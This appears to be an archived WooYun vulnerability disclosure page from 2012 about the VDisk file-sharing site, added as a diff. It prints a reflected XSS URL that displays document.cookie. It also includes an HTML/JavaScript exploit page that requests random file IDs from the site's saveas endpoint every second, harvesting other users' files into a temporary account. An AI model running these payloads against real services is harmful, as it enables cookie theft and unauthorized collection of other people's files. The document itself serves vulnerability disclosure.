@@ -1,0 +1,233 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		威盘任意下载+非持久XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		威盘任意下载+非持久XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小四">小四</a> 
+</li><li>提交时间：		2012-06-07 17:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-07：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-07-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">威盘可以让用户在不注册(系统自动创建用户)的情况下上传文件，无容量限制，而且方便下载，被很多人使用。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.XSS：威盘有个搜索功能，发现了典型的form xss。<br />
+<br />
+http://www.vdisk.cn/tempuser1334906450?s=%22+onmouseover%3Djavascript%3Aalert%28document.cookie%29%3E<br />
+<br />
+<br />
+<br />
+2.任意收藏下载：<br />
+<br />
+威盘的每个文件是这样编号的：http://www.vdisk.cn/down/index/10016545，点击进入，等10秒广告(不想等待的话，清空地址栏输入javascript:document.getElementById(&#039;loadingbox&#039;).style.display=&#039;none&#039;; document.getElementById(&#039;btnbox&#039;).style.display=&#039;block&#039;;)会出现下载地址，有个另存为我的网盘，然后就保存了，如果弹出你没有威盘账号，好办，随便上传一个文件，威盘自动为你分配一个账号，如tempuser1334905592，我是从下面的代码里看到的<br />
+<br />
+</p><pre><code>var loadcount = 1;<br />
+        function saveas(id) {<br />
+                if(jQuery.cookie(&#039;uid&#039;)==null) {<br />
+                        alert(&#039;您还没有登录,请点击右上角登录或免费注册.&#039;);<br />
+                }<br />
+                else {<br />
+                        $.ajaxSetup({async : true, cache : false, type: &quot;GET&quot;});<br />
+                        $.getJSON(&#039;/json/saveas?id=&#039; + id, &#039;&#039; , <br />
+                        function(json){<br />
+                                if(json.result != true) { alert(json.msg); }<br />
+                                else { if(confirm(&quot;文件复制另存成功,是否现在去你的威盘看看?&quot;)) location = &#039;/user/admin/&#039; + jQuery.cookie(&#039;userid&#039;); }<br />
+                        });<br />
+                }<br />
+        }<br />
+<br />
+        $().ready(function(){<br />
+                setTimeout(&quot;document.getElementById(&#039;loadingbox&#039;).style.display=&#039;none&#039;; document.getElementById(&#039;btnbox&#039;).style.display=&#039;block&#039;; &quot;, 10000);<br />
+        });</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+另存为是一个saveas(id)函数。现在你打开这个地址http://www.vdisk.cn/json/saveas?id=&#039; id&#039; (saveas函数的核心)，它通过异步的方式在后台把这个id添加到你的账户里。这也是任意收藏的前提，好了写个工具，间隔打开这个链接，后面的id是7-8位的数字组合，经测试最小为3440540,最大至少为10018135，这样一会儿你的临时临时账户里就会是威盘所有(?)文件的信息了，所谓任意收藏。<br />
+<br />
+利用代码：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />
+&lt;title&gt;威盘任意收藏&lt;/title&gt;<br />
+&lt;style type=&quot;text/css&quot;&gt;<br />
+&lt;!--<br />
+body,td,th {<br />
+        font-size: 24px;<br />
+        color: #FF6;<br />
+}<br />
+body {<br />
+        background-color: #366;<br />
+        margin-left: 20px;<br />
+        margin-top: 20px;<br />
+        margin-right: 20px;<br />
+        margin-bottom: 20px;<br />
+}<br />
+a{ color:#FFF}<br />
+--&gt;<br />
+&lt;/style&gt;&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;script&gt;<br />
+var s=&#039;&#039;;<br />
+function shua(){<br />
+setTimeout(&quot;shua()&quot;,1000);<br />
+s=&quot;http://www.vdisk.cn/json/saveas?id=&quot;+eval(Math.round(Math.random()*6577595)+3440540);<br />
+document.getElementById(&quot;my&quot;).src=s;<br />
+document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a href=&quot;+s+&quot;&gt;&quot;+s+&quot;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&quot;<br />
+}<br />
+shua();<br />
+&lt;/script&gt;<br />
+&lt;p&gt;<br />
+收藏：&lt;span id=&quot;t&quot;&gt;&lt;/span&gt;<br />
+&lt;/p&gt;<br />
+&lt;iframe id=&quot;my&quot; width=&quot;80%&quot;&gt;&lt;/iframe&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+通过任意收藏测试效果：<br />
+<br />
+http://www.vdisk.cn/tempuser1334839579<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/0716304105844f6be0d90501d52de87f8d2f33b7.jpg" target="_blank"><img src="../images/0716304105844f6be0d90501d52de87f8d2f33b7.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/071630573f0c288ec550afea877ce2727fe67f51.jpg" target="_blank"><img src="../images/071630573f0c288ec550afea877ce2727fe67f51.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">设置权限。不然服务器会被刷爆的。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小四" title="小四">小四</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08003" title="威盘任意下载+非持久XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8003";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
